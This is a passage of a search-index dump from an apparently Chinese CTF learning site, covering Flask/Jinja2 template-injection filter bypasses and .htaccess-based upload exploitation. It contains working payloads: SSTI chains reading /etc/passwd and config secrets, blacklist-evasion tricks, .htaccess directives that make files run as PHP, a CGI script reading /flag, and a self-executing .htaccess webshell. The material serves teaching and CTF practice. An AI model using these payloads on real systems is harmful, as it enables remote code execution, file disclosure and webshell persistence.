Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#_6","title":"\u8fc7\u6ee4\u5173\u952e\u5b57","text":"<pre><code>base64\u7f16\u7801\u7ed5\u8fc7(\u7f16\u7801\u7684\u8bdd\u6211\u9690\u7ea6\u8bb0\u5f97py3\u597d\u50cf\u7528\u4e0d\u4e86)\n__getattribute__\u4f7f\u7528\u5b9e\u4f8b\u8bbf\u95ee\u5c5e\u6027\u65f6,\u8c03\u7528\u8be5\u65b9\u6cd5\n\u4f8b\u5982\u88ab\u8fc7\u6ee4\u6389__class__\u5173\u952e\u8bcd\n{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\n\u5b57\u7b26\u4e32\u62fc\u63a5\u7ed5\u8fc7\n{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\nPlain Text\n</code></pre> <p>\u5b57\u7b26\u4e32\u62fc\u63a5</p> <p>1\u3001\u62fc\u63a5</p> <p>\"cla\"+\"ss\"</p> <p>2\u3001\u53cd\u8f6c</p> <p>\"ssalc\"[::-1]</p> <p>3.ascii\u8f6c\u6362</p> <pre><code>\"{0:c}\".format(97)='a'\"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\".format(95,95,99,108,97,115,115,95,95)='__class__'\nPlain Text\n</code></pre> <p>4\u3001\u7f16\u7801\u7ed5\u8fc7</p> <pre><code>\"__class__\"==\"\\x5f\\x5fclass\\x5f\\x5f\"==\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\"\u5bf9\u4e8epython2\u7684\u8bdd\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528base64\u8fdb\u884c\u7ed5\u8fc7\uff08\u6240\u4ee5\u6211\u6ca1\u8bb0\u9519\uff09\"__class__\"==(\"X19jbGFzc19f\").decode(\"base64\")\nPlain Text\n</code></pre> <p>5.\u5229\u7528chr\u51fd\u6570</p> <p>\u56e0\u4e3a\u6211\u4eec\u6ca1\u6cd5\u76f4\u63a5\u4f7f\u7528chr\u51fd\u6570\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7__builtins__\u627e\u5230\u4ed6</p> <pre><code>{% set chr=url_for.__globals__['__builtins__'].chr %}{{\"\"[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}\nPlain Text\n</code></pre> <p>6\u3001\u5728jinja2\u91cc\u9762\u53ef\u4ee5\u5229\u7528~\u8fdb\u884c\u62fc\u63a5</p> <pre><code>{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\nPlain Text\n</code></pre> <p>7\u3001\u5927\u5c0f\u5199\u8f6c\u6362</p> <p>\u524d\u63d0\u662f\u8fc7\u6ee4\u7684\u53ea\u662f\u5c0f\u5199</p> <pre><code>\"\"[\"__CLASS__\".lower()]\nPlain Text\n</code></pre> <p>\u4ee5\u4e0a\u662f\u5e38\u89c1\u7684\u601d\u8def\u3002\u53ef\u662f\u5047\u8bbe\u6709\u4e00\u5929\uff0c\u4f60\u78b0\u5230\u4e86\u8fd9\u6837\u7684\u73a9\u610f\uff0c\u4f60\u8be5\u600e\u4e48\u505a\uff1f</p> <pre><code>blacklist&lt;/br&gt;   '.','[','\\'','\"',''\\\\','+',':','_',&lt;/br&gt;   'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt;   'eval','exec','os','popen','open','read',&lt;/br&gt;   'select','url_for','get_flashed_messages','config','request',&lt;/br&gt;   'count','length','\uff10','\uff11','\uff12','\uff13','\uff14','\uff15','\uff16','\uff17','\uff18','\uff19','0','1','2','3','4','5','6','7','8','9'&lt;/br&gt;    &lt;/br&gt;\nPlain Text\n</code></pre> <p>\u6240\u4ee5\u4e0b\u9762\u8bb2\u4e00\u8bb2\u8fdb\u9636\u64cd\u4f5c\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#flask_2","title":"FLASK\u8fdb\u9636\u64cd\u4f5c","text":"<p>\u8fd9\u91cc\u7684\u91cd\u70b9\u8fd8\u662f\u8fc7\u6ee4\u5668\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#_7","title":"\u5168\u5c40\u641c\u7d22\u59ff\u52bf","text":"<p>url_for\u3001g\u3001request\u3001namespace\u3001lipsum\u3001range\u3001session\u3001dict\u3001get_flashed_messages\u3001cycler\u3001joiner\u3001config\u7b49</p> <p>\u5982\u679c\u4e0a\u9762\u63d0\u5230\u7684 config\u3001self \u4e0d\u80fd\u4f7f\u7528\uff0c\u8981\u83b7\u53d6\u914d\u7f6e\u4fe1\u606f\uff0c\u5c31\u5fc5\u987b\u4ece\u5b83\u7684\u5168\u5c40\u53d8\u91cf\uff08\u8bbf\u95ee\u914d\u7f6e current_app \u7b49\uff09</p> <pre><code>{{url_for.__globals__['current_app'].config.FLAG}}{{get_flashed_messages.__globals__['current_app'].config.FLAG}}{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}\nPython\n</code></pre> <p>\u8fd9\u4e2a\u5c31\u5f88\u7c7b\u4f3c\u662f\u5168\u5c40\u6027\u7684\u641c\u7d22\uff0c\u5c24\u5176\u662furl_for:</p> <p>url_for()\u4f5c\u7528:</p> <p>(1)\u7ed9\u6307\u5b9a\u7684\u51fd\u6570\u6784\u9020 URL\u3002</p> <p>(2)\u8bbf\u95ee\u9759\u6001\u6587\u4ef6(CSS / JavaScript \u7b49)\u3002 \u53ea\u8981\u5728\u4f60\u7684\u5305\u4e2d\u6216\u662f\u6a21\u5757\u7684\u6240\u5728\u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a static \u7684\u6587\u4ef6\u5939\uff0c\u5728\u5e94\u7528\u4e2d\u4f7f\u7528 /static \u5373\u53ef\u8bbf\u95ee\u3002</p> <p>get_flashed_message(\u95ea\u73b0)</p> <p>\u8fd4\u56de\u4e4b\u524d\u5728Flask\u4e2d\u901a\u8fc7 flash() \u4f20\u5165\u7684\u95ea\u73b0\u4fe1\u606f\u5217\u8868\u3002\u628a\u5b57\u7b26\u4e32\u5bf9\u8c61\u8868\u793a\u7684\u6d88\u606f\u52a0\u5165\u5230\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u4e2d\uff0c\u7136\u540e\u901a\u8fc7\u8c03\u7528 get_flashed_messages() \u65b9\u6cd5\u53d6\u51fa(\u95ea\u73b0\u4fe1\u606f\u53ea\u80fd\u53d6\u51fa\u4e00\u6b21\uff0c\u53d6\u51fa\u540e\u95ea\u73b0\u4fe1\u606f\u4f1a\u88ab\u6e05\u7a7a)\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#_8","title":"\u8fc7\u6ee4\u5668","text":"<pre><code>Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is applied to the next.For example, {{ name|striptags|title }} will remove all HTML Tags from variable name and title-case theoutput (title(striptags(name))).\n\u53d8\u91cf\u53ef\u4ee5\u901a\u8fc7\u8fc7\u6ee4\u5668\u4fee\u6539\u3002\u8fc7\u6ee4\u5668\u4e0e\u53d8\u91cf\u4e4b\u95f4\u7528\u7ba1\u9053\u7b26\u53f7\uff08|\uff09\u9694\u5f00\uff0c\u62ec\u53f7\u4e2d\u53ef\u4ee5\u6709\u53ef\u9009\u53c2\u6570\u3002\u53ef\u4ee5\u94fe\u63a5\u591a\u4e2a\u8fc7\u6ee4\u5668\u3002\u4e00\u4e2a\u8fc7\u6ee4\u5668\u7684\u8f93\u51fa\u5e94\u7528\u4e8e\u4e0b\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002\n\u4f8b\u5982\uff0c{{ name|striptags|title }} \u5c06\u5220\u9664\u53d8\u91cf\u540d\u4e2d\u7684\u6240\u6709HTML\u6807\u8bb0\uff0c\u5e76\u5c06title\u5927\u5c0f\u5199\u4e3a\u8f93\u51fa(title(striptags(name)))\u3002\nPlain Text\n</code></pre> <p>\u6545\u540d\u601d\u610f\uff0c\u8fc7\u6ee4\u67d0\u4e9b\u4e1c\u897f\uff0c\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u4e1c\u897f\uff0c\u6216\u8005\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u50cf\u51fd\u6570\u7684\u67d0\u4e2a\u4e1c\u897f\u3002</p> <p>1.attr</p> <p>Get an attribute of an object. foo|attr(\"bar\") works like foo.bar just that always an attribute is returned and items are not looked up.</p> <p>\u83b7\u53d6\u53d8\u91cf\u7684\u503c</p> <pre><code>\"\"|attr(\"__class__\")\u76f8\u5f53\u4e8e\"\".__class__\nPlain Text\n</code></pre> <p>2.format</p> <pre><code>\u7528\u6cd5\n{ \"%s, %s!\"|format(greeting, name) }}\n\u90a3\u4e48\u6211\u4eec\u60f3\u8981\u8c03\u7528__class__\u5c31\u53ef\u4ee5\u7528format\u4e86\uff1a\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)=='__class__'\n\"\"[\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)]\nPlain Text\n</code></pre> <p>3.first last random</p> <ul> <li>Return the first item of a sequence.</li> <li>Return the last item of a sequence.</li> <li>Return a random item from the sequence.</li> </ul> <p>random\u662f\u80fd\u62ff\u522b\u7684\uff08\u53ea\u662f\u8981\u8dd1\u811a\u672c\uff09\uff0c\u5176\u4ed6\u4e24\u4e2a\u53ea\u80fd\u62ff\u9996\u5c3e</p> <p>4.join</p> <p>\u8fd9\u4e2a\u5c31\u5f88\u5173\u952e\u4e86\uff0c\u975e\u5e38\u91cd\u8981</p> <pre><code>Return a string which is the concatenation of the strings in the sequence. The separator between elements is anempty string per default, you can define it with the optional parameter:\n{{ [1, 2, 3]|join('|') }}    -&gt; 1|2|3\n{{ [1, 2, 3]|join }}    -&gt; 123It is also possible to join certain attributes of an object:\n{{ users|join(', ', attribute='username') }}\nPlain Text\n</code></pre> <p>\u770b\u7684\u51fa\u6765\uff0cjoin\u7528\u4ed6\u7684\u53c2\u6570\u4f5c\u4e3a\u524d\u9762\u5217\u8868\u7684\u5206\u9694\u7b26</p> <pre><code>\"\"[['__clas','s__']|join] \u6216\u8005 \"\"[('__clas','s__')|join]\n\u76f8\u5f53\u4e8e\n\"\"[\"__class__\"]\nPlain Text\n</code></pre> <p>5.lower</p> <pre><code>\"\"[\"__CLASS__\"|lower]\u5f88\u50cf\u4e4b\u524d\u7684upper()\u51fd\u6570\nPlain Text\n</code></pre> <p>6.replace reverse</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u66ff\u6362\u548c\u53cd\u8f6c\u8fd8\u539f\u56de\u6211\u4eec\u8981\u7528\u7684\u5b57\u7b26\u4e32\u4e86</p> <pre><code>\"__claee__\"|replace(\"ee\",\"ss\") \u6784\u9020\u51fa\u5b57\u7b26\u4e32 \"__class__\"\"__ssalc__\"|reverse \u6784\u9020\u51fa \"__class__\"\nPlain Text\n</code></pre> <p>7.string</p> <p>\u529f\u80fd\u7c7b\u4f3c\u4e8epython\u5185\u7f6e\u51fd\u6570 str.</p> <p>\u6709\u4e86\u8fd9\u4e2a\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u628a\u663e\u793a\u5230\u6d4f\u89c8\u5668\u4e2d\u7684\u503c\u5168\u90e8\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u518d\u901a\u8fc7\u4e0b\u6807\u5f15\u7528\uff0c\u5c31\u53ef\u4ee5\u6784\u9020\u51fa\u4e00\u4e9b\u5b57\u7b26\u4e86\uff0c\u518d\u901a\u8fc7\u62fc\u63a5\u5c31\u80fd\u6784\u6210\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\u3002</p> <pre><code>().__class__   \u51fa\u6765\u7684\u662f&lt;class 'tuple'&gt;(().__class__|string)[0] \u51fa\u6765\u7684\u662f&lt;\nPlain Text\n</code></pre> <p>8.select unique</p> <pre><code>Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.If no test is specified, each object will be evaluated as a boolean.\u901a\u8fc7\u5bf9\u6bcf\u4e2a\u5bf9\u8c61\u5e94\u7528\u6d4b\u8bd5\u5e76\u4ec5\u9009\u62e9\u6d4b\u8bd5\u6210\u529f\u7684\u5bf9\u8c61\u6765\u7b5b\u9009\u5bf9\u8c61\u5e8f\u5217\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u6d4b\u8bd5\uff0c\u5219\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u5c06\u88ab\u8ba1\u7b97\u4e3a\u5e03\u5c14\u503c\nReturns a list of unique items from the given iterable.\nPlain Text\n</code></pre> <pre><code>()|select|string\u7ed3\u679c\u5982\u4e0b&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;\n(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]\n\u5f97\u5230\u5b57\u7b26\u4e32\"__class__\"\nPlain Text\n</code></pre> <p>9.list</p> <pre><code>\u8f6c\u6362\u6210\u5217\u8868\n\u66f4\u591a\u7684\u7528\u9014\u662f\u914d\u5408\u4e0a\u9762\u7684string\u8f6c\u6362\u6210\u5217\u8868\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u5217\u8868\u91cc\u9762\u7684\u65b9\u6cd5\u53d6\u5b57\u7b26\u4e86\n\u53ea\u662f\u5355\u7eaf\u7684\u5b57\u7b26\u4e32\u7684\u8bdd\u53d6\u5355\u4e2a\u5b57\u7b26\u65b9\u6cd5\u6709\u9650\nPlain Text\n</code></pre> <pre><code>(()|select|string|list).pop(0)\nPlain Text\n</code></pre> <p>10.lipsum</p> <p>\u8fd9\u4e2a\u662f\u4e4b\u524d\u5b66\u5230\u7684\u59ff\u52bf\u3002</p> <p>Lorem ipsum\uff0c\u4e2d\u6587\u53c8\u79f0\u201c\u4e71\u6570\u5047\u6587\u201d\uff0c\u662f\u6307\u4e00\u7bc7\u5e38\u7528\u4e8e\u6392\u7248\u8bbe\u8ba1\u9886\u57df\u7684\u62c9\u4e01\u6587\u6587\u7ae0[1] \uff0c\u4e3b\u8981\u7684\u76ee\u7684\u4e3a\u6d4b\u8bd5\u6587\u7ae0\u6216\u6587\u5b57\u5728\u4e0d\u540c\u5b57\u578b\u3001\u7248\u578b\u4e0b\u770b\u8d77\u6765\u7684\u6548\u679c\uff0c\u901a\u5e38\u7f51\u7ad9\u8fd8\u6ca1\u5efa\u8bbe\u597d\u65f6\u4f1a\u51fa\u73b0\u8fd9\u6bb5\u6587\u5b57</p> <p>\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u4e5f\u662f\u8d77\u5230\u4e86\u8fd9\u6837\u7684\u4f5c\u7528\uff0c\u4e8e\u662f\u6211\u4eec\u7ed3\u5408lipsum|string|list</p> <p>\u5c31\u80fd\u62ff\u5230\u6211\u4eec\u60f3\u8981\u7684\u6570\u5b57\u3002\u5230\u8fd9\u91cc\uff0c\u90a3\u4e2ablacklist\u5c31\u5e94\u8be5\u662f\u6709\u8db3\u591f\u7684\u65b9\u6cd5\u7ed5\u8fc7\u4e86\u3002</p>"},{"location":"web/upload/htaccess/","title":".htaccess","text":"<p>\u642c\u8fd0\u642c\u8fd0</p> <p>\u524d\u8a00</p> <p>.htaccess\u6587\u4ef6\u662fapache\u670d\u52a1\u5668\u7684\u4e00\u79cd\u76ee\u5f55\u7ea7\u522b\u7684\u4fee\u6539\u914d\u7f6e\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u7528\u6765\u914d\u7f6e\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\uff0c\u5e38\u5e38\u88ab\u7528\u4e8e\u8bbf\u95eeURL\u65f6\u91cd\u5199\u8def\u5f84\uff1b\u5728\u6b64\u603b\u7ed3\u4e00\u4e0b\u76f8\u5173\u5229\u7528\u53cabypass\u7684\u65b9\u5f0f</p> <p>\u6d4b\u8bd5\u73af\u5883\uff1aUbuntu18.04+Apache2+php7.2</p> <p><code>/etc/apache2</code>\u4e0b\u6709\u4e24\u4e2a\u6587\u4ef6\u5939<code>mods-enable</code>\u548c<code>mods-available</code>\uff0c\u5176\u4e2d<code>mods-enable</code>\u91cc\u88c5\u7684\u662fapache\u5df2\u7ecf\u88ab\u542f\u7528\u7684\u6a21\u5757\uff0c<code>mods-available</code>\u91cc\u88c5\u7684\u662f\u5f53\u524d\u7cfb\u7edf\u53ef\u7528\u7684\u6a21\u5757\u5207\u6362\u5230<code>mods-enabled</code>\uff0c\u67e5\u770b<code>php7.2.conf</code>\uff1a</p> <p></p> <p>\u901a\u8fc7FilesMath\u5339\u914d\u6587\u4ef6\u540e\u7f00\uff0c\u5176\u9ed8\u8ba4\u914d\u7f6e\u662f\u5f53\u5339\u914d\u5230<code>phar</code>\u3001<code>php</code>\u3001<code>phtml</code>\u65f6\uff0c\u90fd\u5c06\u5176\u4f5c\u4e3aphp\u6765\u6267\u884c\uff0c\u5176\u4e2dSetHandler\u5c31\u662f\u8bbe\u7f6e\u89e3\u6790\u65b9\u5f0f\u4f8b\u5982\u5728<code>1.phar</code>\u4e2d\u5199\u5165<code>&lt;?=phpinfo();</code>\uff1a</p> <p></p>"},{"location":"web/upload/htaccess/#_1","title":"\u5229\u7528\u65b9\u5f0f","text":""},{"location":"web/upload/htaccess/#1sethandler","title":"1.SetHandler","text":"<p>(1)\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>SetHandler application/x-httpd-php\n</code></pre> <p>\u6b64\u65f6\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u88ab\u5f53\u505aphp\u89e3\u6790</p> <p></p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u53ef\u4ee5\u5c06\u5f53\u524d\u76ee\u5f55\u4e0b\u6587\u4ef6\u90fd\u5f53\u505a\u6587\u672c\u89e3\u6790\uff0c\u8fd9\u6837\u4fbf\u53ef\u83b7\u5f97\u6587\u4ef6\u6e90\u7801\uff1a</p> <p></p> <p>(2)2020 de1ctf\u7684checkin\u8fd9\u9053\u9898\u76ee\u7684\u5b98\u65b9wp\u4e2d\u63d0\u5230\u4e86\u8fd9\u79cd\u548c\u7b2c(3)\u79cd\u65b9\u5f0f</p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>SetHandler server-status\n</code></pre> <p>\u8fd9\u79cd\u65b9\u5f0f\u5229\u7528\u4e86apache\u7684\u670d\u52a1\u5668\u72b6\u6001\u4fe1\u606f(\u9ed8\u8ba4\u5173\u95ed)\uff0c\u53ef\u4ee5\u67e5\u770b\u6240\u6709\u8bbf\u95ee\u672c\u7ad9\u7684\u8bb0\u5f55(\u767d\u5ad6)</p> <p></p> <p>\u53ef\u6dfb\u52a0\u53c2\u6570<code>?refresh=5</code>\u6765\u5b9e\u73b0\u6bcf\u96945s\u81ea\u52a8\u5237\u65b0(3)\u8fd9\u79cd\u65b9\u6cd5\u6761\u4ef6\u4e3aapache\u52a0\u8f7d\u4e86<code>cgi_module</code>\uff0c\u8fd9\u91cc\u622a\u7684de1ctf checkin\u8fd9\u9053\u9898\u76ee\u7684phpinfo\uff1a</p> <p></p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>Options +ExecCGIAddHandler cgi-script .xx\n</code></pre> <p>\u7f16\u8f911.xx(\u6ce8\u610f\u683c\u5f0f\u6bd4\u8f83\u4e25\u683c)</p> <pre><code>#! /bin/bash\necho Content-type: text/html\necho \"\"\ncat /flag\n</code></pre> <p>\u53ef\u4ee5\u6210\u529f\u6267\u884c\u6700\u540e\u7684\u547d\u4ee4<code>cat /flag</code></p> <p>\u5f53\u7136\uff0c\u5f00\u542f\u4e86fastcgi\u4e5f\u662f\u53ef\u4ee5\u5229\u7528\u7684\uff0c\u8fd9\u91cc\u4e0d\u5217\u4e3e\u4e86\uff0c\u53ef\u53c2\u8003\u6587\u7ae0\uff1a</p> <pre><code>https://www.freebuf.com/vuls/218495.html\n</code></pre>"},{"location":"web/upload/htaccess/#2addtype","title":"2.AddType","text":"<p>AddType\u53ef\u4ee5\u6307\u793a\u6587\u4ef6\u7ba1\u7406\u7cfb\u7edf\uff0c\u5bf9\u6307\u5b9a\u540e\u7f00\u6587\u4ef6\u4ee5\u9009\u5b9a\u7684\u6587\u4ef6\u7c7b\u578b\u89e3\u6790</p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>AddType application/x-httpd-php .a\n</code></pre> <p>\u4fbf\u4f1a\u5c06\u4ee5<code>.a</code>\u4e3a\u540e\u7f00\u7684\u6587\u4ef6\u89e3\u6790\u4e3aphp</p> <p></p>"},{"location":"web/upload/htaccess/#3php_value","title":"3.php_value","text":"<p>\u8fd9\u79cd\u65b9\u5f0f\u53ef\u901a\u8fc7<code>php_value</code>\u6765\u914d\u7f6ePHP\u7684\u914d\u7f6e\u9009\u9879\uff1b\u53e6\u5916<code>php_flag name on|off</code>\u7528\u6765\u8bbe\u5b9a\u5e03\u5c14\u503c\u7684\u914d\u7f6e\u6307\u4ee4</p> <p>\u67e5\u770b\u914d\u7f6e\u53ef\u88ab\u8bbe\u5b9a\u7684\u8303\u56f4\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u53ef\u77e5\uff0c.htaccess\u53ef\u4ee5\u4f7f\u4e24\u79cd\u914d\u7f6e\u6a21\u5f0f\u751f\u6548\uff1a<code>PHP_INI_PREDIR</code>\u548c<code>PHP_INI_ALL</code></p> <p>\u53ef\u67e5\u770bphp.ini\u914d\u7f6e\u9009\u9879\u5217\u8868\uff0c\u4ece\u4e2d\u5bfb\u627e\u53ef\u5229\u7528\u7684\u914d\u7f6e\u9879</p> <p>(1)\u4f7f\u7528\u6587\u4ef6\u5305\u542b\u7684\u4e24\u4e2a\u76f8\u5173\u914d\u7f6e</p> <p><code>auto_prepend_file</code>\uff1a\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5728\u4e3b\u6587\u4ef6\u89e3\u6790\u4e4b\u524d\u81ea\u52a8\u89e3\u6790</p> <ul> <li> <p><code>auto_append_file</code>\uff1a\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5728\u4e3b\u6587\u4ef6\u89e3\u6790\u540e\u81ea\u52a8\u89e3\u6790</p> </li> <li> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> </li> </ul> <pre><code>php_value auto_prepend_file webshell\n</code></pre> <p>\u7f16\u8f91<code>webshell</code>\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>&lt;?=phpinfo();\n</code></pre> <p>\u6b64\u65f6\u968f\u4fbf\u627e\u4e00\u4e2aphp\u6587\u4ef6\u8bbf\u95ee\uff1a</p> <p></p> <p>\u628a.htaccess\u5185\u5bb9\u6539\u4e3a\u4e0b\u9762\u7684\u4e5f\u662f\u53ef\u4ee5\u7684\uff1a</p> <pre><code>php_value auto_append_file webshell\n</code></pre> <p>\u7531\u4e8e\u901a\u8fc7\u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u9009\u9879\u8fdb\u884c\u6587\u4ef6\u5305\u542b\uff0c\u90a3\u4e48\u4fbf\u53ef\u4f7f\u7528\u76f8\u5173\u7684php\u534f\u8bae\u6d41\uff0c\u5982<code>php://filter</code>\uff0c\u53ef\u7528\u6765\u7ed5\u8fc7\u5bf9\u4e00\u4e9b\u5173\u952e\u5b57\u7684\u68c0\u6d4b\uff0c\u4e0b\u9762Bypass\u90e8\u5206\u4f1a\u63d0\u5230</p> <p>(2)\u7ed5\u8fc7preg_math\u7684\u914d\u7f6e</p> <p>\u67e5\u770b\u5b98\u65b9\u6587\u6863\u4e2d\u7684\u76f8\u5173\u914d\u7f6e\uff1a</p> <p></p> <p>\u7f16\u8f91.htaccess\uff1a</p> <pre><code>php_value pcre.backtrack_limit 0php_value pcre.jit 0\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p>"},{"location":"web/upload/htaccess/#4","title":"4.\u5176\u4ed6","text":"<p>(1)\u7981\u7528\u62d2\u7edd\u89c4\u5219\uff0c\u4f7f.htaccess\u53ef\u8bbf\u95ee</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c.htaccess\u662f\u4e0d\u53ef\u8bbf\u95ee\u7684\uff1a</p> <p></p> <p>\u90a3\u4e48\u7f16\u8f91.htaccess\u6587\u4ef6\uff0c\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a</p> <pre><code>&lt;Files ~ \"^.ht\"&gt;    Require all granted    Order allow,deny    Allow from all&lt;/Files&gt;\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p> <p>(2)\u76f4\u63a5\u4f7f\u7528.htaccess shell</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u4e2a.htaccess\u6587\u4ef6\uff0c\u9996\u5148\u8bbe\u7f6e\u4e86\u7981\u7528\u62d2\u7edd\u89c4\u5219\uff0c\u8fd9\u6837\u4fbf\u53ef\u76f4\u63a5\u8bbf\u95ee\u5230.htaccess\uff1b\u63a5\u7740\u7528<code>SetHandler</code>\u5c06\u6240\u6709\u6587\u4ef6\u4f5c\u4e3aphp\u89e3\u6790\uff0c\u6700\u540e\u5199\u5165php\u4ee3\u7801\uff0c\u5f00\u5934\u7528<code>#</code>\u6ce8\u91ca\u6389\uff0c\u8fd9\u6837\u4fbf\u53ef\u6210\u529f\u89e3\u6790.htaccess\uff0c\u7136\u540e\u89e3\u6790php\uff1a</p> <pre><code>&lt;Files ~ \"^.ht\"&gt; Require all granted Order allow,deny Allow from all&lt;/Files&gt;SetHandler application/x-httpd-php# &lt;?php phpinfo(); ?&gt;\n</code></pre> <p></p> <p>\u76f8\u5173\u7684\u5173\u4e8e.htaccess\u7684shell\uff0c\u53ef\u53c2\u8003github\u4e0a\u4e00\u4e2a\u9879\u76ee\uff1a</p> <pre><code>https://github.com/wireghoul/htshells\n</code></pre>"},{"location":"web/upload/htaccess/#bypass","title":"Bypass\u65b9\u5f0f","text":""},{"location":"web/upload/htaccess/#1","title":"1.\u5173\u952e\u5b57\u68c0\u6d4b","text":"<p>\u65b9\u6cd51</p> <p>\u5982\u679c\u8fc7\u6ee4\u4e86.htaccess\u5e38\u7528\u7684\u5173\u952e\u5b57\uff0c\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u7ebf\u6765\u7ed5\u8fc7\u5bf9\u5173\u952e\u5b57\u7684\u8fc7\u6ee4\uff0c\u53cd\u659c\u7ebf\u540e\u9700\u8981\u52a0\u4e0a\u6362\u884c\u7b26\uff0c\u5e76\u4e14\u53cd\u659c\u7ebf\u524d\u548c\u5173\u952e\u5b57\u65e0\u7a7a\u683c</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>AddType application/x-httpd-php .abc\n</code></pre> <p></p> <p>\u770b\u56fe\u7247\u7684\u8bdd\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u8fd9\u91cc\u7684\u53cd\u659c\u6760\u6709\u70b9\u50cf\u82f1\u6587\u91cc\u9762\u7684-\u8868\u793a\u6362\u884c\u7684\u62fc\u63a5</p> <p>\u65b9\u6cd52</p> <p>\u5982\u679c\u68c0\u6d4b\u4e0d\u80fd\u542b\u6709<code>&lt;?</code>\u7b49php\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6b64\u65f6\u53ef\u5148\u5c06shell\u5b57\u7b26\u4e32\u8fdb\u884c\u7f16\u7801\uff0c\u7136\u540e\u5728\u6587\u4ef6\u5305\u542b\u65f6\u901a\u8fc7<code>php://filter</code>\u89e3\u7801\uff1a</p> <p></p> <p>\u65b9\u6cd53</p> <p>\u901a\u8fc7UTF-7\u3001UTF-16\u7b49\u8fdb\u884c\u7f16\u7801</p> <p></p> <p>\u7f16\u8f91.htaccess\uff1a</p> <pre><code>AddType application/x-httpd-php .aaaphp_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"\n</code></pre> <p>\u4e4b\u540e\u5c06\u540e\u7f00<code>.aaa</code>\u6587\u4ef6\u7684\u5185\u5bb9\u8fdb\u884c\u76f8\u5e94\u7f16\u7801\u5373\u53ef</p>"},{"location":"web/upload/htaccess/#2","title":"2.\u62fc\u63a5\u65e0\u7528\u5b57\u7b26\u4e32","text":"<p>\u65b9\u6cd51</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>#</code>\u6765\u6ce8\u91ca\u6389\u540e\u9762\u62fc\u63a5\u7684\u591a\u4f59\u5185\u5bb9\uff0c<code>#</code>\u9700\u8981\u548c\u524d\u9762\u7684\u5185\u5bb9\u9694\u4e00\u4e2a\u7a7a\u683c\uff0c\u5e76\u4e14<code>#</code>\u53ea\u80fd\u6ce8\u91ca\u4e00\u884c\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u7ebf\u6765\u8f6c\u4e49\u6362\u884c\u7b26\uff0c\u4ece\u800c\u6ce8\u91ca\u591a\u884c\u5185\u5bb9</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u4e2a.htaccess\u6587\u4ef6\u662f\u53ef\u4ee5\u751f\u6548\u7684\uff1a</p> 